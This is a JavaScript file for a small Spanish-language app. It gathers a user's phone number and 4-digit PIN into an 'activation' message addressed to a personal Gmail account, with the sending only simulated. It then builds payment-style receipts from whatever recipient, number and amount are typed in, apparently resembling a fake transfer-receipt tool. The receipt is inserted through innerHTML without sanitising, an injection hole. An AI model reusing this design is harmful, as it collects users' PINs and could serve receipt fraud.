let activatedUsers = []; // Lista para almacenar usuarios activados

function requestActivation() {
    const phone = document.getElementById('phone').value;
    const pin = document.getElementById('pin').value;

    if (phone && pin.length === 4) {
        const email = "rafagonzacara123@gmail.com"; // Correo para activación
        const message = `Nuevo usuario solicita activación:\nTeléfono: ${phone}\nClave: ${pin}`;
        
        // Simulación de envío de correo (usa EmailJS o un backend para enviar realmente)
        console.log(`Enviando correo a ${email}:\n${message}`);
        alert("Solicitud de activación enviada. Espere confirmación.");
    } else {
        alert("Por favor, ingrese un número y una clave válida (4 dígitos).");
    }
}

function login() {
    const phone = document.getElementById('phone').value;

    if (activatedUsers.includes(phone)) {
        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('main-screen').style.display = 'block';
    } else {
        alert("Cuenta no activada. Solicite activación.");
    }
}

function formatAmount() {
    const amountField = document.getElementById('amount');
    const value = amountField.value.replace(/\D/g, ""); // Remover caracteres no numéricos
    amountField.value = new Intl.NumberFormat().format(value); // Formatear con puntos
}

function generateReceipt() {
    const name = document.getElementById('name').value;
    const recipientNumber = document.getElementById('recipient-number').value;
    const amount = document.getElementById('amount').value;

    if (name && recipientNumber && amount) {
        const now = new Date();
        const receiptContent = `
            <strong>Destinatario:</strong> ${name}<br>
            <strong>Número:</strong> ${recipientNumber}<br>
            <strong>Monto:</strong> $${amount}<br>
            <strong>Fecha:</strong> ${now.toLocaleString()}
        `;

        document.getElementById('main-screen').style.display = 'none';
        document.getElementById('receipt-screen').style.display = 'block';
        document.getElementById('receipt-content').innerHTML = receiptContent;
    } else {
        alert("Por favor, complete todos los campos.");
    }
}

function goBack() {
    document.getElementById('receipt-screen').style.display = 'none';
    document.getElementById('main-screen').style.display = 'block';
}
